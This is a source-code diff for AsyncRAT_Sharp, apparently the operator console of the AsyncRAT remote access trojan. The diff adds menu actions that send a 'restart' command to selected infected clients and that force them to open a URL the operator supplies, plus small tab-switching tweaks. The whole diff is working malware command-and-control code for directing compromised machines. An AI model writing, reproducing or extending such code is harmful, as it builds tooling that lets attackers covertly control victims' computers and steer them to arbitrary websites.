@@ -222,6 +222,27 @@ namespace AsyncRAT_Sharp
             }
         }
 
+        private void RESTARTToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                try
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "restart";
+                    foreach (ListViewItem C in listView1.SelectedItems)
+                    {
+                        Clients CL = (Clients)C.Tag;
+                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                }
+            }
+        }
+
         private async void uPDATEToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
@@ -460,6 +481,7 @@ namespace AsyncRAT_Sharp
                         Clients CL = (Clients)C.Tag;
                         ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                     }
+                    tabControl1.SelectedIndex = 1;
                 }
                 catch (Exception ex)
                 {
@@ -481,6 +503,7 @@ namespace AsyncRAT_Sharp
                         Clients CL = (Clients)C.Tag;
                         ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                     }
+                    tabControl1.SelectedIndex = 1;
                 }
                 catch (Exception ex)
                 {
@@ -488,5 +511,28 @@ namespace AsyncRAT_Sharp
                 }
             }
         }
+
+        private void VISITWEBSITEToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                string url = Interaction.InputBox("VISIT WEBSITE", "URL", "https://www.google.com");
+                if (string.IsNullOrEmpty(url))
+                    return;
+                else
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "visitURL";
+                    msgpack.ForcePathObject("URL").AsString = url;
+                    foreach (ListViewItem C in listView1.SelectedItems)
+                    {
+                        Clients CL = (Clients)C.Tag;
+                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
+                    }
+                }
+            }
+        }
+
+
     }
 }
